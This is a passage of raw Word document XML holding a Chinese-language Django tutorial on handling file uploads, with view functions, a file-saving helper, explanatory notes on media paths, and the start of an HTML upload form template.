        <w:t>from django.template.defaultfilters import filesizeformat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F6943BA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D57FA7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7346FB3B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Show file list</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD7BAAB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def file_list(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A07E92E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    files = File.objects.all().order_by("-id")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE1F131" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'file_upload/file_list.html', {'files': files})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CA95AC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="631FDF48" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Regular file upload without using ModelForm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371C3754" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def file_upload(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ADA4954" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD61A84" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = FileUploadForm(request.POST, request.FILES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42019DE1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A903F26" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            # get cleaned data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B0AAFF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            upload_method = form.cleaned_data.get("upload_method")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195A0C04" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            raw_file = form.cleaned_data.get("file")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF35797" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_file = File()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF5DBEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_file.file = handle_uploaded_file(raw_file)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="333C5B36" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_file.upload_method = upload_method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C09BA90" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_file.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA6B547" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return redirect("/file/")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C39849B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460BA061" w14:textId="2AAA1FAB" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = FileUploadForm()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78546F2D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'file_upload/upload_form.html', {'form': form,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C5DFB7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                            'heading': 'Upload files with Regular Form'})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFCEA02" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FB493E2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def handle_uploaded_file(file):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3286F154" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ext = file.name.split('.')[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527F98C2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    file_name = '{}.{}'.format(uuid.uuid4().hex[:10], ext)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164BABDF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # file path relative to 'media' folder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B130702" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    file_path = os.path.join('files', file_name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1907E098" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    absolute_file_path = os.path.join('media', 'files', file_name)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BB7014" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F96317C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    directory = os.path.dirname(absolute_file_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE26958" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not os.path.exists(directory):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41620656" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        os.makedirs(directory)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7116563E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3084D914" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    with open(absolute_file_path, 'wb+') as destination:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA654D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        for chunk in file.chunks():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FC6842" w14:textId="4C9C7E67" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            destination.write(chunk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="524313F8" w14:textId="4954D857" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return file_path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7261EADB" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>注意： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317BC4A0" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>handle_uploaded_file方法里文件写入地址必需是包含/media/的绝对路径，如果/media/files/xxxx.jpg，而该方法返回的地址是相对于/media/文件夹的地址，如/files/xxx.jpg。存在数据中字段的是相对地址，而不是绝对地址。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74330BB5" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>构建文件写入绝对路径时请用os.path.join方法，因为不同系统文件夹分隔符不一样。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD0D758" w14:textId="4FD58001" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>写入文件前一个良好的习惯是使用os.path.exists检查目标文件夹是否存在，如果不存在先创建文件夹，再写入。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E20590" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>上传表单模板upload_form.html代码如下。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73FC40CC"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#file_upload/templates/upload_form.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D5B0DD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "file_upload/base.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45DAF0DE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDE6070" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if heading %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14922DE3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;h3&gt;{{ heading }}&lt;/h3&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1168672C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endif %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66521E05" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>&lt;form action="" method="post" enctype="multipart/form-data" &gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FA7FC75" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
